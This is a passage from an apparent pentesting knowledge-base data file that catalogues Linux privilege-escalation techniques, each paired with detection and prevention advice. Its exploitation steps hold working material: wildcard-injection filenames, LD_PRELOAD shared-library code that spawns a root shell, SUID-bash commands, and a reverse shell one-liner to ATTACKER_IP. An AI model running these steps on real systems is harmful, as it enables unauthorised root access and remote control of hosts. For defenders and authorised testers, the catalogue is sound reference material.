      { command: 'sudo -l', description: 'Check whether any sudo-permitted command uses a wildcard-expanding invocation pattern.', what_to_look_for: 'A sudo rule allowing tar/chown/rsync/zip over a writable directory path with a wildcard.' }
    ],
    exploitation_steps: [
      'Identify a privileged (root cron, root script, or sudo-permitted) command that expands a wildcard over a directory you can write to.',
      'For tar: create files named "--checkpoint=1" and "--checkpoint-action=exec=sh payload.sh" plus the executable payload.sh in that directory.',
      'For chown/chmod: create a file named "--reference=/path/you/control" pointing at a file with attacker-chosen ownership/mode to redirect the operation.',
      'For rsync: create a file named "-e sh payload.sh" to hijack the remote-shell invocation flag.',
      'For zip (when used with -T to test archives): create a file named "--unzip-command=sh payload.sh" to trigger command execution during the test/extract phase.',
      'Trigger the privileged command (wait for the scheduled run, or invoke the sudo-permitted command yourself) and confirm payload.sh executed with the target privilege level.',
      'Use the resulting privileged code execution to spawn a root shell or write a persistent backdoor (SUID bash, new /etc/passwd entry).'
    ],
    tools: ['GTFOBins', 'LinPEAS', 'pspy'],
    detection:
      'Command-line argument auditing via auditd execve logging reveals anomalous flags (--checkpoint-action, --reference, -e, --unzip-command) appearing ' +
      'in what should be routine archive/permission operations.',
    prevention:
      'Always terminate option parsing before a wildcard with -- (e.g. tar czf out.tar.gz -- *) or reference files explicitly with a leading ./ so a ' +
      'leading hyphen cannot be interpreted as a flag; avoid running these operations as root over directories writable by lower-privileged users.',
    real_world_examples: [
      { reference: 'DefenseCode wildcard research (2014)', description: 'The original public disclosure covering tar, chown, and rsync wildcard argument injection, still directly applicable to modern coreutils and tar releases.' }
    ]
  },
  {
    id: 'linux-ld-preload',
    name: 'LD_PRELOAD Environment Variable Exploitation',
    category: 'Environment / Dynamic Linker Abuse',
    difficulty: 'Low',
    likelihood: 'Occasional',
    description:
      'LD_PRELOAD instructs the dynamic linker (ld.so) to load a specified shared object before any other library when a program starts, and any ' +
      'functions defined in that shared object override same-named functions in the normally loaded libraries (a technique called symbol interposition). ' +
      'If sudo is configured to preserve LD_PRELOAD (via env_keep+=LD_PRELOAD in sudoers, or the target command is executed without full environment ' +
      'sanitization), an attacker can compile a minimal shared object containing a constructor function (__attribute__((constructor))) that runs ' +
      'automatically at load time, calls setuid(0); setgid(0);, and spawns a shell -- all before the target program\'s own main() function even executes. ' +
      'Because the malicious library loads inside the context of the privileged sudo-invoked process, the resulting shell inherits root privileges.',
    enumeration_commands: [
      { command: 'sudo -l', description: 'Check for env_keep+=LD_PRELOAD, an explicit LD_PRELOAD passthrough, or any command sudo permits without full environment reset.', what_to_look_for: 'The literal string LD_PRELOAD appearing in the sudo -l output alongside an allowed command.' },
      { command: 'cat /etc/sudoers | grep -i env_keep', description: 'Directly inspect the sudoers configuration for environment-preservation directives.', what_to_look_for: 'Defaults env_keep += "LD_PRELOAD" or similarly permissive Defaults lines.' }
    ],
    exploitation_steps: [
      'Confirm via sudo -l that LD_PRELOAD is preserved for at least one allowed command.',
      'Write a minimal C shared library: #include <stdio.h>\\n#include <sys/types.h>\\n#include <unistd.h>\\nvoid _init(){ setuid(0); setgid(0); system("/bin/bash -p"); }',
      'Compile it as a shared object: gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /tmp/preload.c.',
      'Invoke the sudo-allowed command with the malicious library preloaded: sudo LD_PRELOAD=/tmp/preload.so allowed_command.',
      'The dynamic linker loads preload.so into the sudo-elevated process before the target binary\'s own code runs, executing the constructor and spawning a root shell.',
      'Verify escalation with id, confirming uid=0(root).'
    ],
    tools: ['gcc', 'GTFOBins (LD_PRELOAD sudo entries)', 'LinPEAS'],
    detection:
      'auditd environment-variable logging (execve records include environment when configured) and sudo I/O logging both reveal LD_PRELOAD usage; ' +
      'alerting on any sudo invocation carrying an LD_PRELOAD environment variable is a precise, low-false-positive detection rule.',
    prevention:
      'Never include LD_PRELOAD, LD_LIBRARY_PATH, or other dynamic-linker-related variables in sudoers env_keep; rely on sudo\'s default behavior of ' +
      'resetting the environment (env_reset, the default) for every invocation.',
    real_world_examples: [
      { reference: 'GTFOBins LD_PRELOAD sudo technique', description: 'Documented as a standard sudo bypass across GTFOBins whenever env_keep exposes LD_PRELOAD, and a routine finding in misconfigured sudoers files during real assessments.' }
    ]
  },
  {
    id: 'linux-ld-library-path-hijacking',
    name: 'LD_LIBRARY_PATH Hijacking',
    category: 'Environment / Dynamic Linker Abuse',
    difficulty: 'Medium',
    likelihood: 'Occasional',
    description:
      'LD_LIBRARY_PATH adds additional directories to the dynamic linker\'s shared library search order, taking precedence over the default system ' +
      'library paths recorded in /etc/ld.so.conf and the binary\'s own RPATH/RUNPATH. If a privileged binary (SUID, or run via a sudo rule that ' +
      'preserves LD_LIBRARY_PATH) dynamically links against a library by its bare soname rather than resolving it strictly from a trusted, fixed ' +
      'location, an attacker who controls LD_LIBRARY_PATH can point the linker at a directory containing a malicious library sharing that soname. When ' +
      'the privileged process loads it, attacker-controlled code executes with the process\'s elevated privileges -- typically via a constructor function ' +
      'that calls setuid(0) and spawns a shell, identical in effect to the LD_PRELOAD technique but achieved through library-path manipulation instead ' +
      'of direct preload.',
    enumeration_commands: [
      { command: 'sudo -l', description: 'Check for env_keep+=LD_LIBRARY_PATH on any allowed command.', what_to_look_for: 'LD_LIBRARY_PATH listed among preserved variables.' },
      { command: 'ldd /path/to/suid-binary', description: 'List the libraries a target SUID binary dynamically links against.', what_to_look_for: 'Libraries referenced by bare soname without a hardcoded absolute RPATH, which are subject to search-path manipulation.' }
    ],
    exploitation_steps: [
      'Identify a SUID binary or sudo-allowed command that dynamically links a library by soname without a fixed RPATH, or confirm sudo preserves LD_LIBRARY_PATH.',
      'Determine the exact soname required (via ldd or strings) and write a malicious shared object exporting the same soname with a constructor that calls setuid(0); system("/bin/sh");.',
      'Compile the malicious library and place it in an attacker-writable directory, e.g. gcc -shared -fPIC -o /tmp/libtarget.so.1 /tmp/evil.c.',
      'Set LD_LIBRARY_PATH to that directory and execute the privileged binary: LD_LIBRARY_PATH=/tmp target_suid_binary, or sudo LD_LIBRARY_PATH=/tmp allowed_command if going through sudo.',
      'The dynamic linker prefers the attacker-supplied directory, loads the malicious library into the privileged process, and the constructor executes with elevated privileges.',
      'Verify the resulting shell runs with escalated privileges via id.'
    ],
    tools: ['gcc', 'ldd', 'LinPEAS', 'GTFOBins (LD_LIBRARY_PATH sudo entries)'],
    detection:
      'Similar to LD_PRELOAD, environment-aware execve auditing and sudo I/O logging reveal LD_LIBRARY_PATH usage against sensitive binaries; file ' +
      'integrity monitoring on the actual library search directories also helps catch planted malicious libraries.',
    prevention:
      'Never preserve LD_LIBRARY_PATH in sudoers env_keep, compile privileged binaries with a hardcoded RPATH/RUNPATH or link statically where feasible, ' +
      'and ensure the dynamic linker configuration (/etc/ld.so.conf.d/*) does not include any world-writable directories.',
    real_world_examples: [
      { reference: 'GTFOBins LD_LIBRARY_PATH sudo technique', description: 'Documented across multiple GTFOBins entries as an equally valid variant of the LD_PRELOAD sudo bypass whenever the environment variable is preserved.' }
    ]
  },
  {
    id: 'linux-shared-library-hijacking',
    name: 'Shared Library Hijacking (Missing or Writable .so Dependencies)',
    category: 'Environment / Dynamic Linker Abuse',
    difficulty: 'Medium',
    likelihood: 'Occasional',
    description:
      'Distinct from LD_PRELOAD/LD_LIBRARY_PATH manipulation, this technique targets binaries whose dynamic library dependencies resolve to a path ' +
      'that is either missing entirely (a leftover reference to a development-only or since-removed library) or writable by a lower-privileged user, ' +
      'without requiring any environment variable control at all. Running ldd against the target binary reveals "=> not found" for any dependency the ' +
      'linker cannot resolve, and the specific search order (RPATH, then LD_LIBRARY_PATH, then the ld.so cache, then default paths, then RUNPATH) ' +
      'determines exactly where an attacker needs to plant a replacement library. If any directory in that resolved chain is writable, dropping a ' +
      'malicious library with the missing soname and a malicious constructor achieves code execution the next time the binary runs with elevated ' +
      'privileges.',
    enumeration_commands: [
      { command: 'find / -perm -4000 -exec ldd {} \\; 2>/dev/null | grep "not found"', description: 'Scan every SUID binary for unresolved (missing) shared library dependencies.', what_to_look_for: 'Any "=> not found" line, indicating a library the linker will search for but never locates by default.' },
      { command: 'ls -la $(ldd /path/to/binary | awk \'{print $3}\')', description: 'List the resolved paths of every dependency for a target binary to check their write permissions.', what_to_look_for: 'Any resolved library path that is writable by your user or group.' },
      { command: 'cat /etc/ld.so.conf.d/*.conf', description: 'Review the system-wide dynamic linker search path configuration.', what_to_look_for: 'Any listed directory that is world- or group-writable.' }
    ],
    exploitation_steps: [
      'Run find / -perm -4000 -exec ldd {} \\; 2>/dev/null | grep "not found" to identify SUID binaries with an unresolved library dependency.',
      'Note the exact missing soname (e.g. libcustom.so.1) and determine which search-path directories the linker will check for it (using ldd -v or strace -e openat on the binary).',
      'If any of those directories is writable, write and compile a malicious library exposing that exact soname with a constructor function that calls setuid(0); setgid(0); system("/bin/bash -p");.',
      'Place the compiled library at the resolved path with the correct filename (including any versioned .so.N suffix) so the linker matches it precisely.',
      'Run ldconfig if you have permission (or wait for cache refresh) and then execute the target SUID binary; the linker loads your malicious library and its constructor executes with root privileges.',
      'Confirm the resulting shell has escalated privileges with id.'
    ],
    tools: ['ldd', 'strace', 'gcc', 'ldconfig', 'LinPEAS'],
    detection:
      'File integrity monitoring on all directories listed in /etc/ld.so.conf.d/ and standard library paths, combined with strace-based build-time or ' +
      'runtime checks for "not found" library resolutions on SUID binaries during hardening audits, catches this class before exploitation.',
    prevention:
      'Statically link security-sensitive SUID binaries where practical, ensure every dynamic dependency resolves to a real, root-owned, non-writable ' +
      'path, and remove SUID binaries with unresolved library dependencies entirely rather than leaving stale references from development builds.',
    real_world_examples: [
      { reference: 'CWE-427 / CWE-426 Untrusted Search Path', description: 'Shared library hijacking against SUID binaries with missing dependencies is a recurring finding class in Linux binary security audits and is explicitly modeled in LinPEAS\'s automated SUID library-dependency check.' }
    ]
  },
  {
    id: 'linux-kernel-exploits',
    name: 'Kernel Exploits (Dirty COW, Dirty Pipe, PwnKit, and Related Local Root CVEs)',
    category: 'Kernel Exploitation',
    difficulty: 'High',
    likelihood: 'Occasional',
    description:
      'When no configuration-based privilege escalation path exists, an outdated or unpatched kernel or a vulnerable setuid-root userland component can ' +
      'itself provide a direct path to root through a memory-corruption or logic vulnerability. Several kernel and system-level CVEs have become de ' +
      'facto standard tools in the privesc toolkit due to their reliability and broad applicability across distributions and kernel versions.\n\n' +
      'CVE-2016-5195 ("Dirty COW") is a race condition in the Linux kernel\'s copy-on-write memory subsystem present in virtually every kernel from 2.6.22 ' +
      '(released 2007) through the October 2016 patch, allowing a local attacker to gain write access to memory mappings that should be read-only, most ' +
      'famously used to modify /usr/bin/passwd (or /etc/passwd via a memory-mapped write race) to plant a new root-privileged account despite lacking ' +
      'write permission on the file.\n\n' +
      'CVE-2022-0847 ("Dirty Pipe") is a vulnerability in the Linux pipe buffer handling (kernel versions 5.8 through 5.16.11/5.15.25/5.10.102) that ' +
      'allows overwriting data in arbitrary read-only files, including files owned by root, without requiring any write permission, by splicing data ' +
      'into a page cache that is then flushed back to the underlying file. It is exploited similarly to Dirty COW but is significantly faster and more ' +
      'reliable, and public PoCs can overwrite /etc/passwd or a SUID binary within seconds.\n\n' +
      'CVE-2021-4034 ("PwnKit") is a memory-corruption vulnerability in Polkit\'s pkexec utility, a SUID-root binary shipped by default on nearly every ' +
      'major Linux distribution. pkexec fails to properly handle the case of being invoked with an empty argv array, leading to out-of-bounds memory ' +
      'access that can be manipulated via crafted environment variables to achieve arbitrary code execution as root; because pkexec is SUID-root by ' +
      'default and the bug required no special configuration, PwnKit was assessed as affecting essentially every Polkit-enabled Linux install since 2009.',
    enumeration_commands: [
      { command: 'uname -a', description: 'Print the exact kernel version and architecture for CVE cross-referencing.', what_to_look_for: 'Kernel version strings falling within a known-vulnerable range for Dirty COW, Dirty Pipe, or other kernel LPEs.' },
      { command: 'cat /etc/os-release', description: 'Identify the exact distribution and version for kernel-patch-level cross-referencing (distro kernels are often backported and versioned differently from upstream).', what_to_look_for: 'Distribution/version combinations with a known-unpatched kernel package.' },
      { command: 'ls -la /usr/bin/pkexec ; pkexec --version', description: 'Check for the presence and version of the Polkit pkexec binary to assess PwnKit exposure.', what_to_look_for: 'A SUID-root pkexec binary with a version predating the January 2022 patch (0.120 and earlier lines fixed via distro backports).' },
      { command: './linux-exploit-suggester.sh   OR   ./les.sh', description: 'Run the linux-exploit-suggester script, which automatically compares the running kernel and installed packages against a database of known local root exploits.', what_to_look_for: 'Any "Highly probable" rated CVE in the tool\'s output, prioritized by exploitability and reliability.' },
      { command: 'searchsploit linux kernel local root $(uname -r)', description: 'Query the offline Exploit-DB mirror for public exploit code matching the running kernel version.', what_to_look_for: 'Matching entries with "Local Privilege Escalation" in the title.' }
    ],
    exploitation_steps: [
      'Run uname -a and cat /etc/os-release to precisely fingerprint the kernel version and distribution.',
      'Run linux-exploit-suggester (or its Python equivalent, linux-exploit-suggester-2) to get a ranked, automated list of candidate kernel/userland CVEs.',
      'For a Dirty Pipe (CVE-2022-0847) candidate on kernel 5.8-5.16.11 (or the relevant backport-fixed point release), download and compile a public PoC that overwrites a target root-owned SUID binary or /etc/passwd with attacker-controlled content via the pipe-splice technique.',
      'For a Dirty COW (CVE-2016-5195) candidate on pre-October-2016 kernels, use a public PoC (e.g. the classic dirtycow.c targeting /etc/passwd) that races a madvise(MADV_DONTNEED) call against a write to a memory-mapped read-only file to plant a new root user entry.',
      'For a PwnKit (CVE-2021-4034) candidate, confirm a SUID pkexec binary is present and run a public PoC that crafts a malicious environment and shared library to trigger the out-of-bounds write in pkexec\'s argument-handling code, directly spawning a root shell with no further steps.',
      'Compile any C-based PoC using a matching glibc/kernel header environment (ideally on the target itself, or in a container matching the target distro/version, to avoid ABI mismatches).',
      'Execute the compiled exploit and verify a root shell or modified /etc/passwd entry was obtained; confirm with id showing uid=0(root).',
      'Exercise particular caution with kernel exploits during authorized engagements: a failed or unstable kernel exploit can crash the target system, so always confirm scope permits this risk and prefer well-tested, widely-used PoCs over experimental code.'
    ],
    tools: ['linux-exploit-suggester', 'linux-exploit-suggester-2', 'searchsploit', 'gcc', 'Metasploit (local_exploit_suggester)', 'Watson (cross-platform equivalent concept)'],
    detection:
      'Kernel-level exploitation is difficult to detect after the fact via standard logging since many of these bugs operate below normal syscall audit ' +
      'granularity, but auditd can still catch resulting artifacts (unexpected modification of /etc/passwd, a SUID pkexec spawning a root shell), and ' +
      'EDR/kernel integrity monitoring (Falco, kernel module signing enforcement) can flag anomalous memory operations. The most effective defense is ' +
      'proactive patch management rather than reactive detection.',
    prevention:
      'Apply kernel and Polkit security patches promptly through a formal patch management process; track the running kernel version against the ' +
      'distribution\'s security advisories, use automated vulnerability scanning that fingerprints kernel version against CVE databases, and where ' +
      'immediate patching is not possible, apply distro-provided mitigations (e.g. live-patching via kpatch/livepatch, or vendor-issued workarounds).',
    real_world_examples: [
      { reference: 'CVE-2016-5195 (Dirty COW)', description: 'A nine-year-old kernel race condition disclosed in 2016 affecting every Linux kernel since 2.6.22, exploited widely in the wild before and after disclosure, and still found on unpatched legacy systems during penetration tests.' },
      { reference: 'CVE-2022-0847 (Dirty Pipe)', description: 'Disclosed by Max Kellermann in 2022, comparable in impact and reliability to Dirty COW but far faster to exploit, affecting kernels 5.8 through the initial fixed point releases; rapidly weaponized with public PoCs within a day of disclosure.' },
      { reference: 'CVE-2021-4034 (PwnKit)', description: 'Discovered by Qualys, affecting the SUID-root pkexec binary shipped by virtually every major Linux distribution since Polkit\'s 2009 introduction of pkexec; assessed as one of the broadest-impact local privesc bugs in years due to zero configuration prerequisites.' }
    ]
  },
  {
    id: 'linux-writable-systemd-service',
    name: 'Writable systemd Service Unit File Exploitation',
    category: 'Service/Init Abuse',
    difficulty: 'Low',
    likelihood: 'Occasional',
    description:
      'systemd unit files define how services start, including the ExecStart, ExecStartPre, ExecStartPost, ExecReload, and ExecStop directives, and ' +
      'most system services run as root by default unless a User= directive restricts them. If a unit file under /etc/systemd/system/, ' +
      '/usr/lib/systemd/system/, or an included drop-in directory (service.d/*.conf) is writable by a lower-privileged user, that user can modify the ' +
      'ExecStart line (or add an ExecStartPre directive) to run an arbitrary command. The next time the service starts, restarts, or the system reboots ' +
      '-- or immediately, if the attacker also has permission to run systemctl restart on that unit, or if it is triggered by a timer or socket -- the ' +
      'injected command executes with the service\'s configured privileges, typically root.',
    enumeration_commands: [
      { command: 'find /etc/systemd/system /usr/lib/systemd/system /lib/systemd/system -writable 2>/dev/null', description: 'Search all standard systemd unit directories for files or drop-in directories writable by the current user.', what_to_look_for: 'Any .service, .timer, or .socket file, or any service.d drop-in directory, that returns as writable.' },
      { command: 'systemctl list-unit-files --type=service | grep enabled', description: 'Enumerate all enabled services to prioritize which writable unit files are actually active or will run on next boot.', what_to_look_for: 'Enabled status on any unit found writable in the previous step.' },
      { command: 'systemctl show SERVICE_NAME -p User -p ExecStart', description: 'Check whether a specific service runs as root (no User= directive, or explicitly User=root) and view its current ExecStart command.', what_to_look_for: 'An empty/root User property combined with write access to the underlying unit file.' }
    ],
    exploitation_steps: [
      'Enumerate writable systemd unit files across /etc/systemd/system, /usr/lib/systemd/system, and drop-in service.d directories.',
      'For each writable unit that runs as root (no User= restriction), confirm the service is enabled or can be manually started/restarted by your current privileges (or wait for a natural restart/reboot).',
      'Edit the unit file to insert a malicious ExecStartPre or replace ExecStart entirely, e.g. ExecStartPre=/bin/bash -c \'chmod u+s /bin/bash\'.',
      'Run systemctl daemon-reload to make systemd re-read the modified unit file (required after any unit file change).',
      'Restart the service if you have permission (systemctl restart SERVICE_NAME) or wait for the next natural trigger (boot, timer, socket activation).',
      'Once the service starts, the injected command executes as root; confirm via the resulting SUID bash or a caught reverse shell connection.',
      'Run /bin/bash -p to obtain an interactive root shell if the SUID-bash technique was used, then verify with id.'
    ],
    tools: ['systemctl', 'LinPEAS', 'pspy'],
    detection:
      'File integrity monitoring on all systemd unit directories, combined with auditd write-watches (auditctl -w /etc/systemd/system -p wa -k ' +
      'systemd_unit_tamper), immediately flags unauthorized unit file modification; systemd journal logging also records every daemon-reload and service ' +
      'restart event for correlation.',
    prevention:
      'Ensure all systemd unit files are owned by root with mode 0644 and no group/world write access; apply the same change-management and review ' +
      'process to service unit changes as to any other privileged configuration change.',
    real_world_examples: [
      { reference: 'CWE-732 Incorrect Permission Assignment for Critical Resource', description: 'Writable systemd unit files are a modern equivalent of writable SysV init scripts and are a standard finding in configuration-management-driven environments where file permissions are set incorrectly by an automation tool.' }
    ]
  },
  {
    id: 'linux-dbus-exploitation',
    name: 'D-Bus Service Exploitation',
    category: 'IPC / Service Abuse',
    difficulty: 'Medium',
    likelihood: 'Rare',
    description:
      'D-Bus is the standard Linux inter-process communication (IPC) bus used by systemd, NetworkManager, Polkit, and countless desktop and system ' +
      'services to expose methods and signals to other processes. Services register objects on the system bus (accessible system-wide, mediated by a ' +
      'security policy in /etc/dbus-1/system.d/*.conf) or the session bus (per-user). If a system-bus service exposes a privileged method without a ' +
      'corresponding Polkit action check, or if the D-Bus policy configuration grants overly broad "allow" rules (e.g. allowing any user to call any ' +
      'method on a root-running service), an unprivileged local user can invoke that method directly to perform privileged actions -- restarting ' +
      'arbitrary services, changing system configuration, or in some documented cases directly executing commands -- without any authentication check.',
    enumeration_commands: [
      { command: 'busctl list', description: 'List all currently registered names/services on the D-Bus system bus.', what_to_look_for: 'Non-standard or custom service names that might expose an interesting privileged interface.' },
      { command: 'busctl tree org.freedesktop.SERVICE_NAME', description: 'Enumerate the object tree exposed by a specific D-Bus service to find available object paths.', what_to_look_for: 'Object paths related to configuration, user management, or process control.' },
      { command: 'busctl introspect org.freedesktop.SERVICE_NAME /object/path', description: 'Introspect a specific object to list its exposed methods, properties, and signals along with their signatures.', what_to_look_for: 'Methods with names suggesting privileged actions (SetPassword, ExecuteCommand, Restart) with no corresponding Polkit authentication requirement.' },
      { command: 'cat /etc/dbus-1/system.d/*.conf', description: 'Review D-Bus system bus security policy files directly.', what_to_look_for: 'Overly permissive <allow> rules granting broad send_destination or send_interface access to non-root users.' }
    ],
    exploitation_steps: [
      'Enumerate registered D-Bus system services with busctl list and identify any custom or third-party service beyond standard systemd/NetworkManager/Polkit components.',
      'Introspect promising services with busctl introspect to map out exposed methods and their required argument signatures.',
      'Attempt to call a privileged-sounding method directly using busctl call org.freedesktop.SERVICE /object/path org.freedesktop.Interface MethodName signature args, without any prior authentication.',
      'If the call succeeds without a Polkit authorization prompt or failure, the service is missing an access control check; leverage the exposed method to perform the intended privileged action (e.g. restart a root service in a way that executes attacker-controlled configuration, or directly manipulate a sensitive system setting).',
      'Where the exposed functionality allows writing configuration or triggering a script, chain it into a privileged code-execution primitive (similar to writable systemd unit exploitation).',
      'Confirm privilege escalation was achieved and document the exact D-Bus service, object path, and method that lacked authorization.'
    ],
    tools: ['busctl', 'd-feet (GUI D-Bus browser)', 'dbus-send', 'LinPEAS'],
    detection:
      'D-Bus system bus activity can be logged via auditd dbus policy hooks or by enabling verbose dbus-daemon logging; monitoring for method calls ' +
      'against sensitive interfaces from unexpected UIDs is the primary detection approach, though this requires deliberate instrumentation since ' +
      'default D-Bus logging is minimal.',
    prevention:
      'Every privileged D-Bus method should enforce a corresponding Polkit action check (using polkit_authority_check_authorization or the ' +
      'g_dbus_method_invocation pattern) rather than relying solely on bus policy <allow> rules, and D-Bus system policy files should be reviewed to ' +
      'ensure send_destination/send_interface access is scoped as narrowly as possible.',
    real_world_examples: [
      { reference: 'CWE-306 Missing Authentication for Critical Function', description: 'Custom or third-party D-Bus services that expose administrative methods without a Polkit check are a recurring class of finding in Linux desktop and embedded-device security research.' }
    ]
  },
  {
    id: 'linux-polkit-cve-2021-3560',
    name: 'Polkit CVE-2021-3560 Authentication Bypass',
    category: 'Polkit Exploitation',
    difficulty: 'Low',
    likelihood: 'Rare',
    description:
      'CVE-2021-3560 is an authentication bypass vulnerability in polkit\'s polkitd daemon (versions roughly 0.113 through the June 2021 patch, ' +
      'affecting distributions that shipped these versions such as certain Red Hat Enterprise Linux 8, Fedora, Debian, and Ubuntu releases). The bug ' +
      'exploits a race condition in how polkit handles a D-Bus connection that disconnects while its authorization request is still being processed: by ' +
      'requesting a privileged D-Bus action and then killing the requesting process at precisely the right moment (before polkitd finishes looking up the ' +
      'now-nonexistent connection\'s UID), polkitd falls back to treating the request as coming from UID 0, effectively granting root authorization to an ' +
      'unauthenticated, unprivileged caller. This can be leveraged directly to create a new privileged user account via the accountsservice D-Bus ' +
      'interface (org.freedesktop.Accounts), since account creation is itself a Polkit-gated privileged action.',
    enumeration_commands: [
      { command: 'pkaction --version   OR   dpkg -l | grep policykit-1   OR   rpm -qa | grep polkit', description: 'Check the installed polkit/policykit version against the CVE-2021-3560 affected range.', what_to_look_for: 'Versions in the 0.113 to 0.118 range (exact numbering varies by distro packaging) predating the June 3, 2021 fix.' }
    ],
    exploitation_steps: [
      'Confirm the installed polkit version falls in the vulnerable range using the package manager.',
      'Download or write a public proof-of-concept script that automates the race condition: it repeatedly issues a D-Bus request via dbus-send targeting org.freedesktop.Accounts CreateUser (or a similarly privileged accountsservice method) and kills the dbus-send process mid-request in a tight timing loop.',
      'Run the PoC script; due to the timing-dependent nature of the race, it may need to loop hundreds or thousands of times before succeeding.',
      'On success, a new user account is created via accountsservice with root-equivalent privileges (or with a password you control) despite the caller having no prior authorization.',
      'Set a password for the newly created account (many PoCs automate this step via dbus-send calls to SetPassword) and then su to that account or add it to sudoers/root group.',
      'Verify escalation and clean up the created account after demonstrating impact if required by the engagement scope.'
    ],
    tools: ['dbus-send', 'public CVE-2021-3560 PoC scripts', 'busctl'],
    detection:
      'Auditd/D-Bus logging of repeated, rapidly disconnected authorization requests against accountsservice can reveal exploitation attempts; the ' +
      'primary practical defense is patching rather than behavioral detection, since the race condition leaves minimal distinctive log signal.',
    prevention:
      'Patch polkit to a version containing the fix for CVE-2021-3560 (0.119 or later, or the equivalent distro-backported fix); track polkit package ' +
      'versions as part of routine vulnerability management given its broad presence across Linux desktop and server installs.',
    real_world_examples: [
      { reference: 'CVE-2021-3560', description: 'Discovered by GitHub Security Lab researcher Kevin Backhouse, notable for being exploitable via extremely simple, widely available command-line tools (dbus-send, systemd-run) with no custom exploit compilation required, making it trivially weaponizable once disclosed.' }
    ]
  },
  {
    id: 'linux-python-library-hijacking',
    name: 'Python Library Hijacking (sys.path / PYTHONPATH Injection)',
    category: 'Environment / Interpreter Abuse',
    difficulty: 'Medium',
    likelihood: 'Occasional',
    description:
      'Python resolves imported modules by searching a list of directories in sys.path, which is built from (in order) the invoking script\'s own ' +
      'directory, the PYTHONPATH environment variable, and the interpreter\'s standard library and site-packages directories. If a privileged Python ' +
      'script (run via cron, a SUID wrapper, or a sudo-permitted invocation that preserves PYTHONPATH) imports a module by name without pinning to a ' +
      'fully qualified path, and any earlier-searched directory is writable by a lower-privileged user, that user can place a malicious module with the ' +
      'same name in the writable directory. When the privileged script runs, Python imports the attacker\'s module instead of (or before) the legitimate ' +
      'one, and any top-level code in the malicious module -- including a call to os.system() or a reverse-shell payload -- executes immediately during ' +
      'the import, inheriting the script\'s privileges.',
    enumeration_commands: [
      { command: 'sudo -l', description: 'Check for env_keep+=PYTHONPATH or any sudo-permitted python/python3 invocation.', what_to_look_for: 'PYTHONPATH in the preserved environment list, or a python script allowed to run as root/another user.' },
      { command: 'find / -name "*.py" -writable 2>/dev/null', description: 'Search for writable Python files, especially ones imported by a privileged script.', what_to_look_for: 'Writable modules located alongside or imported by a root-run script.' },
      { command: 'python3 -c "import sys; print(sys.path)"', description: 'Inspect the default module search path to identify any writable directory present in it.', what_to_look_for: 'A writable directory (e.g. a package directory under /usr/local/lib/python3.x/dist-packages, or the script\'s own working directory) appearing in sys.path.' }
    ],
    exploitation_steps: [
      'Identify a privileged Python script (cron job, sudo-allowed command, SUID wrapper) and determine which modules it imports.',
      'Check whether any module is imported by bare name from a package/directory that is writable, or whether PYTHONPATH is preserved through sudo.',
      'Write a malicious .py file with the exact same name as a legitimately imported module, containing payload code at the top level (outside any function), e.g. import os; os.system("chmod u+s /bin/bash").',
      'Place the malicious module in a writable directory that will be searched before the legitimate module\'s real location, or set PYTHONPATH explicitly if sudo preserves it: sudo PYTHONPATH=/tmp/evil python3 target_script.py.',
      'Trigger the privileged script (wait for cron, or invoke via sudo) so that Python imports the malicious module during its normal startup import sequence.',
      'Confirm the injected payload executed with elevated privileges (SUID bash bit set, or a caught reverse shell), then obtain a stable privileged shell.'
    ],
    tools: ['LinPEAS', 'GTFOBins (PYTHONPATH sudo entries)', 'pspy'],
    detection:
      'auditd execve logging with environment capture reveals PYTHONPATH manipulation against sensitive scripts; file integrity monitoring on Python ' +
      'package directories and any script-adjacent module paths referenced by privileged automation catches planted malicious modules.',
    prevention:
      'Never preserve PYTHONPATH in sudoers env_keep, use fully qualified imports or virtual environments with locked-down, non-writable site-packages ' +
      'for privileged scripts, and avoid placing privileged scripts in directories where their imported modules could be shadowed by a writable path.',
    real_world_examples: [
      { reference: 'GTFOBins PYTHONPATH sudo technique', description: 'Documented as a standard sudo environment-variable bypass, directly analogous to LD_PRELOAD but targeting Python\'s own module resolution instead of the dynamic linker.' }
    ]
  },
  {
    id: 'linux-writable-bashrc-profile',
    name: 'Writable .bashrc / .profile / /etc/profile.d Exploitation',
    category: 'Persistence / Shell Startup Abuse',
    difficulty: 'Low',
    likelihood: 'Occasional',
    description:
      'Shell startup files (~/.bashrc, ~/.bash_profile, ~/.profile for individual users, and /etc/profile, /etc/bash.bashrc, and scripts under ' +
      '/etc/profile.d/ system-wide) execute automatically whenever a matching shell session starts. If a higher-privileged user\'s shell startup file is ' +
      'writable by a lower-privileged attacker -- commonly seen when home directories are group-writable, when a system-wide profile.d script is ' +
      'mistakenly left writable, or when a privileged user\'s dotfiles are managed by a misconfigured configuration-management tool -- an attacker can ' +
      'insert a malicious command that executes the next time that user opens an interactive shell or logs in, including via su, ssh, or a scheduled ' +
      'task that spawns a login shell. This is a highly reliable technique whenever it applies because it requires no exploit at all, only a wait for ' +
      'the victim user (frequently root, if root\'s own dotfiles or a system-wide profile script are writable) to start a new session.',
    enumeration_commands: [
      { command: 'ls -la ~/.bashrc ~/.bash_profile ~/.profile /root/.bashrc 2>/dev/null', description: 'Check write permissions on your own and, if accessible, root\'s shell startup files.', what_to_look_for: 'Any startup file writable by your current user despite belonging to a different, higher-privileged account.' },
      { command: 'find / -maxdepth 4 -name ".bashrc" -o -name ".bash_profile" -o -name ".profile" 2>/dev/null | xargs ls -la', description: 'Broaden the search across all discoverable home directories for writable startup files belonging to other users.', what_to_look_for: 'Startup files for privileged accounts (root, service accounts with interactive shells) that are group- or world-writable.' },
      { command: 'ls -la /etc/profile.d/ /etc/profile /etc/bash.bashrc', description: 'Check the system-wide profile scripts that run for every user\'s login shell.', what_to_look_for: 'Any script writable by a non-root user, since these execute for every interactive login including root\'s.' }
    ],
    exploitation_steps: [
      'Enumerate readable/writable startup files for both your own account and any other accounts (especially root) discoverable on the filesystem.',
      'If a system-wide profile.d script or /etc/bash.bashrc is writable, append a payload that will execute for every subsequent interactive login by any user, including root.',
      'If a specific privileged user\'s personal .bashrc/.profile is writable, append a targeted payload such as a SUID-granting command or a reverse shell one-liner.',
      'Choose a payload appropriate to the wait time available: chmod u+s /bin/bash for a passive, persistent escalation path usable whenever the victim next logs in, or bash -i >/dev/tcp/ATTACKER_IP/4444 0>&1 for an active reverse shell (set up a listener first).',
      'Wait for the target user to start a new interactive shell session (a fresh SSH login, a su - invocation, or a screen/tmux session start all typically source these files).',
      'When the payload fires, catch the reverse shell or use the now-SUID /bin/bash with the -p flag to obtain a privileged shell.',
      'Remove the injected line after demonstrating impact if required by the engagement\'s rules of engagement.'
    ],
